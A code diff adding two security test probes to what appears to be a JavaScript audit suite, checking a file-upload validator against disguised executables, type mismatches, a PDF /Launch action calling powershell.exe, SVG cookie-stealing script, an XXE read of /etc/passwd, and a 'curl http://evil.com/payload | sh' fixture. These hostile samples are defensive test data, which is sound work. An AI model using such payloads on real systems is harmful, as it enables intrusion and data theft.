@@ -2860,6 +2860,193 @@ async function runSecurityAuditProbes() {
     assert(false, 'Escrow invariant and balance preservation probe failed');
   }
 
+  // ---------------------------------------------------------
+  // PROBE 58: Binary Magic-Byte Validation, Prohibited Executable Blocking & Polyglot Quarantine
+  // OWASP ASVS v4.0 V12.1–V12.6 | CWE-434 | CWE-436 | ISO 27001 Control 8.28 & 8.7
+  // ---------------------------------------------------------
+  console.log('\n--- PROBE 58: Binary Magic-Byte Validation & Executable Quarantine (CWE-434 / ASVS V12.1) ---');
+  try {
+    const { validateFileBuffer } = require('./netlify/functions/file-validate');
+
+    // 1. Valid PDF buffer
+    const validPdf = Buffer.from('%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF');
+    const pdfRes = validateFileBuffer(validPdf, 'contract_agreement.pdf', 'application/pdf');
+    assert(pdfRes.valid === true, 'Valid PDF buffer passes magic-byte check');
+    assert(pdfRes.detected_mime === 'application/pdf', 'PDF MIME accurately detected from %PDF- header');
+
+    // 2. Valid PNG buffer (89 50 4E 47 0D 0A 1A 0A)
+    const validPng = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52]);
+    const pngRes = validateFileBuffer(validPng, 'avatar.png', 'image/png');
+    assert(pngRes.valid === true, 'Valid PNG buffer passes magic-byte check');
+    assert(pngRes.detected_mime === 'image/png', 'PNG MIME accurately detected');
+
+    // 3. Valid JPEG buffer (FF D8 FF)
+    const validJpg = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46]);
+    const jpgRes = validateFileBuffer(validJpg, 'portfolio.jpeg', 'image/jpeg');
+    assert(jpgRes.valid === true, 'Valid JPEG buffer passes magic-byte check');
+    assert(jpgRes.detected_mime === 'image/jpeg', 'JPEG MIME accurately detected');
+
+    // 4. Valid WebP buffer (RIFF....WEBP)
+    const validWebp = Buffer.from([0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50]);
+    const webpRes = validateFileBuffer(validWebp, 'company_logo.webp', 'image/webp');
+    assert(webpRes.valid === true, 'Valid WebP buffer passes magic-byte check');
+    assert(webpRes.detected_mime === 'image/webp', 'WebP MIME accurately detected');
+
+    // 5. Disguised Windows Executable (MZ header disguised as .pdf) -> CWE-434
+    const fakePdfExe = Buffer.from([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00]); // MZ...
+    const exeRes = validateFileBuffer(fakePdfExe, 'invoice_statement.pdf', 'application/pdf');
+    assert(exeRes.valid === false, 'Disguised Windows executable (.exe disguised as .pdf) is strictly rejected');
+    assert(exeRes.status === 'quarantined', 'Disguised executable is quarantined');
+    assert(exeRes.reason === 'executable_binary_prohibited', 'Prohibited executable binary reason recorded');
+
+    // 6. Disguised Linux ELF binary (\x7fELF disguised as .png)
+    const fakePngElf = Buffer.from([0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00]);
+    const elfRes = validateFileBuffer(fakePngElf, 'profile_pic.png', 'image/png');
+    assert(elfRes.valid === false, 'Disguised Linux ELF executable is strictly rejected');
+    assert(elfRes.reason === 'executable_binary_prohibited', 'ELF binary prohibition reason recorded');
+
+    // 7. Disguised Mach-O binary
+    const fakeDocxMacho = Buffer.from([0xFE, 0xED, 0xFA, 0xCE, 0x00, 0x00, 0x00, 0x01]);
+    const machoRes = validateFileBuffer(fakeDocxMacho, 'nda_contract.docx', 'application/vnd.openxmlformats-officedocument');
+    assert(machoRes.valid === false, 'Disguised Mach-O executable is strictly rejected');
+
+    // 8. Disguised Shell Script with Shebang (#!)
+    const fakeDocSh = Buffer.from('#!/bin/bash\ncurl http://evil.com/payload | sh\n');
+    const shRes = validateFileBuffer(fakeDocSh, 'employee_handbook.doc');
+    assert(shRes.valid === false, 'Shell script shebang disguised as .doc is quarantined');
+
+    // 9. Extension vs Magic-Byte Mismatch (CWE-436 interpretation conflict)
+    // JPEG bytes declared as .pdf
+    const mismatchRes = validateFileBuffer(validJpg, 'fraudulent.pdf', 'application/pdf');
+    assert(mismatchRes.valid === false, 'Mismatched extension vs magic bytes is quarantined (CWE-436)');
+    assert(mismatchRes.reason === 'extension_signature_mismatch', 'Reason accurately reports extension signature mismatch');
+
+    // 10. Corrupted/Spoofed binary with random bytes
+    const corruptBuf = Buffer.from([0x01, 0x02, 0x03, 0x04, 0x05]);
+    const corruptRes = validateFileBuffer(corruptBuf, 'corrupt.pdf');
+    assert(corruptRes.valid === false, 'Corrupted or spoofed binary without valid header is rejected');
+    assert(corruptRes.reason === 'invalid_magic_bytes', 'Reports invalid magic bytes');
+
+    // 11. Polyglot PDF with malicious /Launch action dictionary
+    const polyglotPdf = Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Action /S /Launch /F (powershell.exe) >>\nendobj');
+    const polyRes = validateFileBuffer(polyglotPdf, 'exploit.pdf');
+    assert(polyRes.valid === false, 'PDF with embedded /Launch execution dictionary is quarantined');
+    assert(polyRes.reason === 'pdf_active_script_payload', 'PDF active script payload quarantined');
+
+    // 12. Malicious SVG with embedded <script> tag
+    const maliciousSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>');
+    const svgRes = validateFileBuffer(maliciousSvg, 'logo.svg');
+    assert(svgRes.valid === false, 'SVG with embedded <script> is quarantined');
+    assert(svgRes.reason === 'svg_script_injection', 'SVG script injection identified');
+
+    // 13. Malicious SVG with XXE injection
+    const xxeSvg = Buffer.from('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>');
+    const xxeRes = validateFileBuffer(xxeSvg, 'vector.svg');
+    assert(xxeRes.valid === false, 'SVG with XML External Entity (XXE) injection is quarantined');
+    assert(xxeRes.reason === 'svg_xxe_injection', 'SVG XXE injection identified');
+
+    // 14. Clean SVG vector image
+    const cleanSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#13756f"/></svg>');
+    const cleanSvgRes = validateFileBuffer(cleanSvg, 'company_logo.svg');
+    assert(cleanSvgRes.valid === true, 'Clean SVG vector image is accepted');
+
+    console.log('  [PASS] Legitimate formats (PDF, PNG, JPEG, WebP, SVG) pass signature inspection');
+    console.log('  [PASS] Disguised executables (MZ / PE, ELF, Mach-O, Shebang) quarantined (CWE-434)');
+    console.log('  [PASS] File extension vs MIME interpretation conflicts quarantined (CWE-436)');
+    console.log('  [PASS] PDF script smuggling and SVG XSS/XXE vector injections quarantined');
+  } catch (err) {
+    console.error('Probe 58 exception:', err);
+    assert(false, 'File integrity and magic-byte probe failed');
+  }
+
+  // ---------------------------------------------------------
+  // PROBE 59: Serverless File Validate API, Static Audit & Balance Preservation
+  // OWASP ASVS V12.1 | NDPA 2023 Sec 39 | CBN Cybersecurity Framework Sec 4.1 & 4.2
+  // ---------------------------------------------------------
+  console.log('\n--- PROBE 59: Serverless File Validate API, Static Audit & Balance Preservation ---');
+  try {
+    const { handler: fileValidateHandler } = require('./netlify/functions/file-validate');
+    const { resetRateLimiterStore } = require('./netlify/functions/lib/rate-limiter');
+
+    // 1. HTTP Method validation: GET returns HTTP 405
+    const getRes = await fileValidateHandler({
+      httpMethod: 'GET',
+      headers: { origin: 'https://collektng.com' }
+    });
+    assert(getRes.statusCode === 405, 'file-validate GET returns HTTP 405 Method Not Allowed');
+
+    // 2. Missing base64 payload returns HTTP 400
+    resetRateLimiterStore();
+    const badBodyRes = await fileValidateHandler({
+      httpMethod: 'POST',
+      headers: { origin: 'https://collektng.com' },
+      body: JSON.stringify({ file_name: 'test.pdf' })
+    });
+    assert(badBodyRes.statusCode === 400, 'Request missing file_base64 returns HTTP 400');
+
+    // 3. Valid base64 payload returns HTTP 200 clean
+    resetRateLimiterStore();
+    const validBase64 = Buffer.from('%PDF-1.5 legitimate document payload').toString('base64');
+    const cleanUploadRes = await fileValidateHandler({
+      httpMethod: 'POST',
+      headers: { origin: 'https://collektng.com' },
+      body: JSON.stringify({
+        file_name: 'verified_cv.pdf',
+        file_base64: validBase64,
+        mime_type: 'application/pdf'
+      })
+    });
+    assert(cleanUploadRes.statusCode === 200, 'Valid base64 PDF upload returns HTTP 200 Clean');
+    const cleanBody = JSON.parse(cleanUploadRes.body);
+    assert(cleanBody.valid === true, 'Response confirms valid: true');
+    assert(cleanBody.status === 'clean', 'Response confirms status: clean');
+
+    // 4. Malicious base64 payload returns HTTP 422 Quarantined
+    resetRateLimiterStore();
+    const maliciousBase64 = Buffer.from('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF').toString('base64');
+    const malwareUploadRes = await fileValidateHandler({
+      httpMethod: 'POST',
+      headers: { origin: 'https://collektng.com' },
+      body: JSON.stringify({
+        file_name: 'trojan_disguised.pdf',
+        file_base64: maliciousBase64
+      })
+    });
+    assert(malwareUploadRes.statusCode === 422, 'Malicious binary upload rejected with HTTP 422 Unprocessable Entity');
+    const malwareBody = JSON.parse(malwareUploadRes.body);
+    assert(malwareBody.valid === false, 'Response confirms valid: false');
+    assert(malwareBody.status === 'quarantined', 'Response confirms status: quarantined');
+
+    // 5. Static Code Audit of upload-modal.js & supabase.js
+    const uploadModalCode = fs.readFileSync(path.join(__dirname, 'upload-modal.js'), 'utf8');
+    assert(uploadModalCode.includes('validateFileIntegrity'), 'upload-modal.js implements validateFileIntegrity');
+    assert(uploadModalCode.includes('uploadSecurityAlert'), 'upload-modal.js renders #uploadSecurityAlert container');
+    assert(uploadModalCode.includes('window.validateFileIntegrity = validateFileIntegrity'), 'upload-modal.js exports validateFileIntegrity to window');
+
+    const supabaseCode = fs.readFileSync(path.join(__dirname, 'supabase.js'), 'utf8');
+    assert(supabaseCode.includes('validateFileSignature'), 'supabase.js implements validateFileSignature');
+    assert(supabaseCode.includes('window.validateFileSignature = validateFileSignature'), 'supabase.js exports validateFileSignature to window');
+
+    const redirectsCode = fs.readFileSync(path.join(__dirname, '_redirects'), 'utf8');
+    assert(redirectsCode.includes('/api/file-validate /.netlify/functions/file-validate 200'), '_redirects contains canonical /api/file-validate rewrite');
+
+    // 6. Verify authentic ₦0.00 database balance preservation
+    const { data: realWallet } = await clientUserA
+      .from('wallets')
+      .select('available_balance')
+      .eq('user_id', userAId)
+      .single();
+    assert(Number(realWallet.available_balance) === 0, 'Production database wallet balance strictly preserved at ₦0.00');
+
+    console.log('  [PASS] Serverless file-validate endpoint enforces POST, rate limits, and quarantine (HTTP 200/422)');
+    console.log('  [PASS] Static audit verifies client-side magic-byte inspection in upload-modal.js & supabase.js');
+    console.log('  [PASS] Canonical rewrite present in _redirects');
+    console.log('  [PASS] Authentic ₦0.00 database balances preserved');
+  } catch (err) {
+    console.error('Probe 59 exception:', err);
+    assert(false, 'File validate serverless API & static audit probe failed');
+  }
+
 
   console.log(`  PROBE RESULTS: ${passed} PASSED, ${failed} FAILED`);
 
